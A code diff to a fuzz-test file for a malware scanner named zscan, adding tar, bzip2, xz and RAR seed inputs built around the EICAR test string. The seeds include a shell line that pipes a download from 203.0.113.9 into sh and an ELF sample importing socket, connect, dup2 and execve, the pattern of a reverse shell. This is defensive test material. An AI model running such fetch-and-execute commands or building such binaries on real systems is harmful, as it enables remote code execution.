@@ -1,5 +1,7 @@
 """The scanner is pointed at hostile input, so it must never crash on it."""
+import bz2
 import gzip
+import lzma
 import random
 
 import pytest
@@ -9,7 +11,7 @@ from zscan.cli import main
 from zscan.scanner import Scanner
 from zscan.yara_engine import YaraEngine
 
-from samples import EICAR, benign_pe, build_elf, make_zip, packed_like_pe
+from samples import EICAR, benign_pe, build_elf, make_tar, make_zip, packed_like_pe
 
 SEEDS = {
     "pe": benign_pe(),
@@ -18,6 +20,10 @@ SEEDS = {
     "gzip": gzip.compress(make_zip({"eicar.com": EICAR})),
     "elf64": build_elf(imports=("socket", "connect", "dup2", "execve")),
     "elf32-be": build_elf(bits=32, big=True, imports=("socket",)),
+    "tar": make_tar({"a.txt": b"hello", "b/eicar.com": EICAR}),
+    "bzip2": bz2.compress(make_tar({"eicar.com": EICAR})),
+    "xz": lzma.compress(make_tar({"eicar.com": EICAR})),
+    "rar": b"Rar!\x1a\x07\x01\x00" + bytes(range(256)) * 4,
     "script": b"#!/bin/sh\ncurl http://203.0.113.9/x | sh\n" * 20,
 }
 
